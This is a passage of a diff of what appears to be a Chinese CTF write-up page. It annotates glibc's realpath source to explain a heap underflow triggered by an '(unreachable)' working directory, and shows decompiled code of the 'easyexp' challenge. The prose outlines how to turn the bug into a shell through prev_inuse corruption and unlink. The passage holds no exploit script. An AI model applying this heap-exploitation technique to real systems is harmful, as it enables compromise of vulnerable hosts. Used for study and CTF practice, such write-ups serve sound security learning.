- start) &gt;= rpath_limit) <span class="comment">// rpath_limit = rpath + path_max</span></span><br><span class="line">	    &#123;</span><br><span class="line">           <span class="comment">// ...</span></span><br><span class="line">	    &#125;</span><br><span class="line">      <span class="comment">// dest为前溢地址，start为路径../../x处的x的地址，即从路径中拷贝第三个片段到dest中</span></span><br><span class="line">      <span class="comment">// void *mempcpy（void *dest, const void *src, size_t len)</span></span><br><span class="line">	  dest = __mempcpy (dest, start, end - start);</span><br><span class="line">	  *dest = <span class="string">'\0'</span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// __lxstat64可以用来检查rpath指向的文件是否存在，rpath即为(unreachable)/xxxxx</span></span><br><span class="line">	  <span class="keyword">if</span> (__lxstat64 (_STAT_VER, rpath, &amp;st) &lt; <span class="number">0</span>)</span><br><span class="line">	    <span class="keyword">goto</span> error;</span><br><span class="line"></span><br><span class="line">	  <span class="keyword">if</span> (S_ISLNK (st.st_mode))</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="keyword">char</span> *buf = __alloca (path_max);</span><br><span class="line">	      <span class="keyword">size_t</span> len;</span><br><span class="line"></span><br><span class="line">	      <span class="keyword">if</span> (++num_links &gt; __eloop_threshold ())</span><br><span class="line">		&#123;</span><br><span class="line">		  __set_errno (ELOOP);</span><br><span class="line">		  <span class="keyword">goto</span> error;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	      n = __readlink (rpath, buf, path_max - <span class="number">1</span>);</span><br><span class="line">	      <span class="keyword">if</span> (n &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> error;</span><br><span class="line">	      buf[n] = <span class="string">'\0'</span>;</span><br><span class="line"></span><br><span class="line">	      <span class="keyword">if</span> (!extra_buf)</span><br><span class="line">		extra_buf = __alloca (path_max);</span><br><span class="line"></span><br><span class="line">	      len = <span class="built_in">strlen</span> (end);</span><br><span class="line">	      <span class="keyword">if</span> ((<span class="keyword">long</span> <span class="keyword">int</span>) (n + len) &gt;= path_max)</span><br><span class="line">		&#123;</span><br><span class="line">		  __set_errno (ENAMETOOLONG);</span><br><span class="line">		  <span class="keyword">goto</span> error;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	      <span class="comment">/* Careful here, end may be a pointer into extra_buf... */</span></span><br><span class="line">	      memmove (&amp;extra_buf[n], end, len + <span class="number">1</span>);</span><br><span class="line">	      name = end = <span class="built_in">memcpy</span> (extra_buf, buf, n);</span><br><span class="line"></span><br><span class="line">	      <span class="keyword">if</span> (buf[<span class="number">0</span>] == <span class="string">'/'</span>)</span><br><span class="line">		dest = rpath + <span class="number">1</span>;	<span class="comment">/* It's an absolute symlink */</span></span><br><span class="line">	      <span class="keyword">else</span></span><br><span class="line">		<span class="comment">/* Back up to previous component, ignore if at root already: */</span></span><br><span class="line">		<span class="keyword">if</span> (dest &gt; rpath + <span class="number">1</span>)</span><br><span class="line">		  <span class="keyword">while</span> ((--dest)[<span class="number">-1</span>] != <span class="string">'/'</span>);</span><br><span class="line">	    &#125;</span><br><span class="line">	  <span class="keyword">else</span> <span class="keyword">if</span> (!S_ISDIR (st.st_mode) &amp;&amp; *end != <span class="string">'\0'</span>)</span><br><span class="line">	    &#123;</span><br><span class="line">	      __set_errno (ENOTDIR);</span><br><span class="line">	      <span class="keyword">goto</span> error;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (dest &gt; rpath + <span class="number">1</span> &amp;&amp; dest[<span class="number">-1</span>] == <span class="string">'/'</span>)</span><br><span class="line">    --dest;</span><br><span class="line">  *dest = <span class="string">'\0'</span>;</span><br><span class="line"></span><br><span class="line">  assert (resolved == <span class="literal">NULL</span> || resolved == rpath);</span><br><span class="line">  <span class="keyword">return</span> rpath;</span><br><span class="line"></span><br><span class="line">error:</span><br><span class="line">  assert (resolved == <span class="literal">NULL</span> || resolved == rpath);</span><br><span class="line">  <span class="keyword">if</span> (resolved == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="built_in">free</span> (rpath);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">versioned_symbol (libc, __realpath, realpath, GLIBC_2_3);</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *</span><br><span class="line">__canonicalize_file_name (<span class="keyword">const</span> <span class="keyword">char</span> *name)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> __realpath (name, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line">weak_alias (__canonicalize_file_name, canonicalize_file_name)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Return the canonical absolute name of a given file.</span></span><br><span class="line"><span class="comment">   Copyright (C) 1996-2016 Free Software Foundation, Inc.</span></span><br><span class="line"><span class="comment">   This file is part of the GNU C Library.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   The GNU C Library is free software; you can redistribute it and/or</span></span><br><span class="line"><span class="comment">   modify it under the terms of the GNU Lesser General Public</span></span><br><span class="line"><span class="comment">   License as published by the Free Software Foundation; either</span></span><br><span class="line"><span class="comment">   version 2.1 of the License, or (at your option) any later version.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   The GNU C Library is distributed in the hope that it will be useful,</span></span><br><span class="line"><span class="comment">   but WITHOUT ANY WARRANTY; without even the implied warranty of</span></span><br><span class="line"><span class="comment">   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU</span></span><br><span class="line"><span class="comment">   Lesser General Public License for more details.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   You should have received a copy of the GNU Lesser General Public</span></span><br><span class="line"><span class="comment">   License along with the GNU C Library; if not, see</span></span><br><span class="line"><span class="comment">   &lt;http://www.gnu.org/licenses/&gt;.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;limits.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stddef.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;eloop-threshold.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;shlib-compat.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Return the canonical absolute name of file NAME.  A canonical name</span></span><br><span class="line"><span class="comment">   does not contain any `.&#x27;, `..&#x27; components nor any repeated path</span></span><br><span class="line"><span class="comment">   separators (&#x27;/&#x27;) or symlinks.  All path components must exist.  If</span></span><br><span class="line"><span class="comment">   RESOLVED is null, the result is malloc&#x27;d; otherwise, if the</span></span><br><span class="line"><span class="comment">   canonical name is PATH_MAX chars or more, returns null with `errno&#x27;</span></span><br><span class="line"><span class="comment">   set to ENAMETOOLONG; if the name fits in fewer than PATH_MAX chars,</span></span><br><span class="line"><span class="comment">   returns the name in RESOLVED.  If the name cannot be resolved and</span></span><br><span class="line"><span class="comment">   RESOLVED is non-NULL, it contains the path of the first component</span></span><br><span class="line"><span class="comment">   that cannot be resolved.  If the path can be resolved, RESOLVED</span></span><br><span class="line"><span class="comment">   holds the same value as the value returned.  */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *</span><br><span class="line">__realpath (<span class="keyword">const</span> <span class="keyword">char</span> *name, <span class="keyword">char</span> *resolved) <span class="comment">//name是传入的字符串</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> *rpath, *dest, *extra_buf = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *start, *end, *rpath_limit;</span><br><span class="line">  <span class="keyword">long</span> <span class="keyword">int</span> path_max;</span><br><span class="line">  <span class="keyword">int</span> num_links = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="comment">// 此部分是常规的一些检查，不影响理解代码逻辑</span></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 设置path_max参数</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> PATH_MAX</span></span><br><span class="line">  path_max = PATH_MAX;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  path_max = pathconf (name, _PC_PATH_MAX);</span><br><span class="line">  <span class="keyword">if</span> (path_max &lt;= <span class="number">0</span>)</span><br><span class="line">    path_max = <span class="number">1024</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (resolved == <span class="literal">NULL</span>) <span class="comment">// __canonicalize_file_name默认传参NULL</span></span><br><span class="line">    &#123;</span><br><span class="line">      rpath = <span class="built_in">malloc</span> (path_max); <span class="comment">// 申请保存解析后的路径的chunk，发生溢出的即为该chunk</span></span><br><span class="line">      <span class="keyword">if</span> (rpath == <span class="literal">NULL</span>)</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    rpath = resolved;</span><br><span class="line">  rpath_limit = rpath + path_max;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (name[<span class="number">0</span>] != <span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (!__getcwd (rpath, path_max)) <span class="comment">// getcwd返回rpath的地址</span></span><br><span class="line">	&#123;</span><br><span class="line">	  rpath[<span class="number">0</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">	  <span class="keyword">goto</span> error;</span><br><span class="line">	&#125;</span><br><span class="line">      dest = __rawmemchr (rpath, <span class="string">&#x27;\0&#x27;</span>); <span class="comment">// dest记录rpath中字符串的结尾</span></span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      rpath[<span class="number">0</span>] = <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">      dest = rpath + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (start = end = name; *start; start = end)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">stat64</span> <span class="title">st</span>;</span></span><br><span class="line">      <span class="keyword">int</span> n;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Skip sequence of multiple path-separators.  */</span></span><br><span class="line">      <span class="keyword">while</span> (*start == <span class="string">&#x27;/&#x27;</span>) <span class="comment">// 如果以/开头，向后移动</span></span><br><span class="line">	++start;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Find end of path component.  */</span></span><br><span class="line">      <span class="keyword">for</span> (end = start; *end &amp;&amp; *end != <span class="string">&#x27;/&#x27;</span>; ++end)</span><br><span class="line">	<span class="comment">/* Nothing.  */</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (end - start == <span class="number">0</span>)</span><br><span class="line">	<span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (end - start == <span class="number">1</span> &amp;&amp; start[<span class="number">0</span>] == <span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">	<span class="comment">/* nothing */</span>;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (end - start == <span class="number">2</span> &amp;&amp; start[<span class="number">0</span>] == <span class="string">&#x27;.&#x27;</span> &amp;&amp; start[<span class="number">1</span>] == <span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="comment">/* Back up to previous component, ignore if at root already.  */</span></span><br><span class="line">	  <span class="comment">// dest初始值为rpath中字符串（getcwd返回值）的结尾</span></span><br><span class="line">	  <span class="comment">// 如果遇到..，向前搜索/字符，初始情况下：dest = rpath + len &gt; rpath + 1。所以在第一个..时会在while中出现前向溢出</span></span><br><span class="line">	  <span class="keyword">if</span> (dest &gt; rpath + <span class="number">1</span>)</span><br><span class="line">	    <span class="keyword">while</span> ((--dest)[<span class="number">-1</span>] != <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="keyword">size_t</span> new_size;</span><br><span class="line"></span><br><span class="line">	  <span class="keyword">if</span> (dest[<span class="number">-1</span>] != <span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">	    *dest++ = <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">      <span class="comment">// 在触发漏洞前，dest已经向前溢出，加上len后不会超过rpath_limit</span></span><br><span class="line">	  <span class="keyword">if</span> (dest + (end - start) &gt;= rpath_limit) <span class="comment">// rpath_limit = rpath + path_max</span></span><br><span class="line">	    &#123;</span><br><span class="line">           <span class="comment">// ...</span></span><br><span class="line">	    &#125;</span><br><span class="line">      <span class="comment">// dest为前溢地址，start为路径../../x处的x的地址，即从路径中拷贝第三个片段到dest中</span></span><br><span class="line">      <span class="comment">// void *mempcpy（void *dest, const void *src, size_t len)</span></span><br><span class="line">	  dest = __mempcpy (dest, start, end - start);</span><br><span class="line">	  *dest = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// __lxstat64可以用来检查rpath指向的文件是否存在，rpath即为(unreachable)/xxxxx</span></span><br><span class="line">	  <span class="keyword">if</span> (__lxstat64 (_STAT_VER, rpath, &amp;st) &lt; <span class="number">0</span>)</span><br><span class="line">	    <span class="keyword">goto</span> error;</span><br><span class="line"></span><br><span class="line">	  <span class="keyword">if</span> (S_ISLNK (st.st_mode))</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="keyword">char</span> *buf = __alloca (path_max);</span><br><span class="line">	      <span class="keyword">size_t</span> len;</span><br><span class="line"></span><br><span class="line">	      <span class="keyword">if</span> (++num_links &gt; __eloop_threshold ())</span><br><span class="line">		&#123;</span><br><span class="line">		  __set_errno (ELOOP);</span><br><span class="line">		  <span class="keyword">goto</span> error;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	      n = __readlink (rpath, buf, path_max - <span class="number">1</span>);</span><br><span class="line">	      <span class="keyword">if</span> (n &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> error;</span><br><span class="line">	      buf[n] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">	      <span class="keyword">if</span> (!extra_buf)</span><br><span class="line">		extra_buf = __alloca (path_max);</span><br><span class="line"></span><br><span class="line">	      len = <span class="built_in">strlen</span> (end);</span><br><span class="line">	      <span class="keyword">if</span> ((<span class="keyword">long</span> <span class="keyword">int</span>) (n + len) &gt;= path_max)</span><br><span class="line">		&#123;</span><br><span class="line">		  __set_errno (ENAMETOOLONG);</span><br><span class="line">		  <span class="keyword">goto</span> error;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	      <span class="comment">/* Careful here, end may be a pointer into extra_buf... */</span></span><br><span class="line">	      memmove (&amp;extra_buf[n], end, len + <span class="number">1</span>);</span><br><span class="line">	      name = end = <span class="built_in">memcpy</span> (extra_buf, buf, n);</span><br><span class="line"></span><br><span class="line">	      <span class="keyword">if</span> (buf[<span class="number">0</span>] == <span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">		dest = rpath + <span class="number">1</span>;	<span class="comment">/* It&#x27;s an absolute symlink */</span></span><br><span class="line">	      <span class="keyword">else</span></span><br><span class="line">		<span class="comment">/* Back up to previous component, ignore if at root already: */</span></span><br><span class="line">		<span class="keyword">if</span> (dest &gt; rpath + <span class="number">1</span>)</span><br><span class="line">		  <span class="keyword">while</span> ((--dest)[<span class="number">-1</span>] != <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">	    &#125;</span><br><span class="line">	  <span class="keyword">else</span> <span class="keyword">if</span> (!S_ISDIR (st.st_mode) &amp;&amp; *end != <span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">	    &#123;</span><br><span class="line">	      __set_errno (ENOTDIR);</span><br><span class="line">	      <span class="keyword">goto</span> error;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (dest &gt; rpath + <span class="number">1</span> &amp;&amp; dest[<span class="number">-1</span>] == <span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">    --dest;</span><br><span class="line">  *dest = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">  assert (resolved == <span class="literal">NULL</span> || resolved == rpath);</span><br><span class="line">  <span class="keyword">return</span> rpath;</span><br><span class="line"></span><br><span class="line">error:</span><br><span class="line">  assert (resolved == <span class="literal">NULL</span> || resolved == rpath);</span><br><span class="line">  <span class="keyword">if</span> (resolved == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="built_in">free</span> (rpath);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">versioned_symbol (libc, __realpath, realpath, GLIBC_2_3);</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *</span><br><span class="line">__canonicalize_file_name (<span class="keyword">const</span> <span class="keyword">char</span> *name)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> __realpath (name, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line">weak_alias (__canonicalize_file_name, canonicalize_file_name)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
 <p>从源代码中可以发现，如果getcwd返回的地址不以/开头的话，就会产生堆的上溢的问题，同时能够向这个上溢的地址写入数据。</p>
 <h2 id="easyexp"><a href="#easyexp" class="headerlink" title="easyexp"></a>easyexp</h2><p>本题的原理即<code>__canonicalize_file_name</code>。在本题中，由于程序变更工作目录后，并没有更新当前目录的根目录，因此<code>getcwd()</code> 会在返回的路径前加上<code>(unreachable)</code>，即<code>getcwd()</code>在本题中返回<code>(unreachable)/tmp</code>。随后为了保证程序正常运行，需要通过<code>__lxstat64()</code>的检查，所以需要保证<code>(unreachable)/tmp</code>存在，故将用户名设置为<code>(unreachable)</code>并在该文件夹下创建名为<code>tmp</code>的文件。</p>
 <p>由于存在堆上的前溢且程序构造了堆的使用，因此可以修改chunk的<code>pre_inuse</code>，利用<code>unlink</code>获得shell。</p>
 <h4 id="程序创建文件的过程"><a href="#程序创建文件的过程" class="headerlink" title="程序创建文件的过程"></a>程序创建文件的过程</h4><p>在程序中定义了如下数据结构：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">FILE_CACHE</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> *content;</span><br><span class="line">    <span class="keyword">int</span> content_length;</span><br><span class="line">    <span class="keyword">char</span> filename[<span class="number">84</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
 <p>在bss上存在一个<code>FILE_CACHE[3]</code>数组用于保存相关信息。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( filename )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strstr</span>(filename, <span class="string">".."</span>) || *filename == <span class="string">'/'</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"you can't go out of tmpfs"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">2</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(filename, (<span class="keyword">const</span> <span class="keyword">char</span> *)(<span class="number">0x60</span>LL * i + <span class="number">0x60318C</span>)) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"write something:"</span>);</span><br><span class="line">        InputString((__int64)FILE_CACHE[<span class="number">12</span> * i], (<span class="keyword">unsigned</span> <span class="keyword">int</span>)FILE_CACHE[<span class="number">12</span> * i + <span class="number">1</span>]);</span><br><span class="line">        g_idx = (i + <span class="number">1</span>) % <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v8;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( FILE_CACHE[<span class="number">12</span> * g_idx] )</span><br><span class="line">    &#123;</span><br><span class="line">      s = fopen((<span class="keyword">const</span> <span class="keyword">char</span> *)(<span class="number">0x60</span>LL * g_idx + <span class="number">0x60318C</span>), <span class="string">"w"</span>);</span><br><span class="line">      fwrite(FILE_CACHE[<span class="number">12</span> * g_idx], <span class="number">1u</span>LL, LODWORD(FILE_CACHE[<span class="number">12</span> * g_idx + <span class="number">1</span>]), s);</span><br><span class="line">      fclose(s);</span><br><span class="line">      <span class="built_in">free</span>((<span class="keyword">void</span> *)FILE_CACHE[<span class="number">12</span> * g_idx]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">strcpy</span>((<span class="keyword">char</span> *)(<span class="number">0x60</span>LL * g_idx + <span class="number">0x60318C</span>), filename);</span><br><span class="line">    fd = open(filename, <span class="number">131521</span>, <span class="number">420L</span>L);</span><br><span class="line">    <span class="keyword">if</span> ( fd &lt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"mkfile:create failed."</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"write something:"</span>);</span><br><span class="line">    InputString((__int64)&amp;buf, <span class="number">0x1000</span>u);</span><br><span class="line">    write(fd, &amp;buf, <span class="number">0x1000</span>uLL);</span><br><span class="line">    v2 = g_idx;</span><br><span class="line">    FILE_CACHE[<span class="number">12</span> * v2] = strdup(&amp;buf);</span><br><span class="line">    v3 = g_idx;</span><br><span class="line">    LODWORD(FILE_CACHE[<span class="number">12</span> * v3 + <span class="number">1</span>]) = <span class="built_in">strlen</span>(&amp;buf);</span><br><span class="line">    close(fd);</span><br><span class="line">    g_idx = (g_idx + <span class="number">1</span>) % <span class="number">3</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span 